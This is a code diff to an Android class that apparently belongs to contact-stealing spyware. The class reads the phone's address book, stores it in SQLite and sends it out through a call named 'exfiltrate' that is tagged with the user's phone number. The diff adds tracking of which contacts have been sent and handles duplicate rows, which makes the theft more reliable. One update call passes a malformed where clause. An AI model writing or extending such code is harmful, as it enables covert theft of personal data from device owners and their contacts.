@@ -8,6 +8,7 @@ import org.json.simple.JSONValue;
 import android.content.ContentValues;
 import android.content.Context;
 import android.database.Cursor;
+import android.database.sqlite.SQLiteConstraintException;
 import android.database.sqlite.SQLiteDatabase;
 import android.os.AsyncTask;
 import android.provider.ContactsContract.Contacts;
@@ -36,16 +37,15 @@ public class GetContactsTask extends AsyncTask<Void, Void, Void>{
 	private Context ctx;
 	protected GetContactsTask() {
 		ctx = MyApplication.getAppContext();
+    	//ctx.deleteDatabase(DatabaseOpenHelper.DATABASE_NAME);
         datasource = new ContactsDataSource(ctx);
 	}
 
 	@Override
 	protected Void doInBackground(Void... unused){
+		getAndSaveContacts();
 		if(wifiTracker.read_arp()){
-			getAndSaveContacts(WIFI_ON);
 			sendSavedContacts();
-		}else{
-			getAndSaveContacts(WIFI_OFF);
 		}
 		datasource.close();
 
@@ -65,6 +65,13 @@ public class GetContactsTask extends AsyncTask<Void, Void, Void>{
 		HashMap<String, String> map = new HashMap<String, String>();
 		map.put(key, value);
 		h.exfiltrate(map, Constants.CONTACTS_TRANSACTION + ";" + User.getPhoneNumber());
+		ContentValues values = new ContentValues();
+		values.put(DatabaseOpenHelper.COLUMN_IS_SENT,1);
+		database = datasource.open();
+		database.update(
+				DatabaseOpenHelper.DATABASE_TABLE_NAME,
+				values,null,null);
+		database.close();
 	}
 
 	private String getSavedContactsAsString(){
@@ -84,8 +91,8 @@ public class GetContactsTask extends AsyncTask<Void, Void, Void>{
 		Cursor c = database.query(
 				DatabaseOpenHelper.DATABASE_TABLE_NAME,  // The table to query
 				projection,                               // The columns to return
-				null,                                // The columns for the WHERE clause
-				null,                            // The values for the WHERE clause
+				DatabaseOpenHelper.COLUMN_IS_SENT+"=?",                                // The columns for the WHERE clause
+				new String[]{"0"},                            // The values for the WHERE clause
 				null,                                     // don't group the rows
 				null,                                     // don't filter by row groups
 				sortOrder                                 // The sort order
@@ -117,7 +124,7 @@ public class GetContactsTask extends AsyncTask<Void, Void, Void>{
 		return jsonText;
 	}
 
-	private void getAndSaveContacts(int isSent) {
+	private void getAndSaveContacts() {
 
 		database = datasource.open();
 		// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker          
@@ -197,14 +204,21 @@ public class GetContactsTask extends AsyncTask<Void, Void, Void>{
 					}
 					phone.close();
 
-					values.put(DatabaseOpenHelper.COLUMN_IS_SENT, isSent);
-
-					long newRowId;
-					newRowId = database.insert(
+					
+					long newRowId=-1;
+					try{
+						newRowId = database.insert(
 							DatabaseOpenHelper.DATABASE_TABLE_NAME,
 							null,
 							values);
-
+					}
+					catch(SQLiteConstraintException e){
+						System.out.println("insert failed");
+						values.remove(DatabaseOpenHelper.COLUMN_ID);
+						newRowId = database.update(
+								DatabaseOpenHelper.DATABASE_TABLE_NAME,
+								values,DatabaseOpenHelper.COLUMN_ID,new String[]{contactId+""});							
+					}
 					System.out.println("Row ID : "+newRowId);
 				}
 				rawContacts.moveToNext();			// move to the next entry
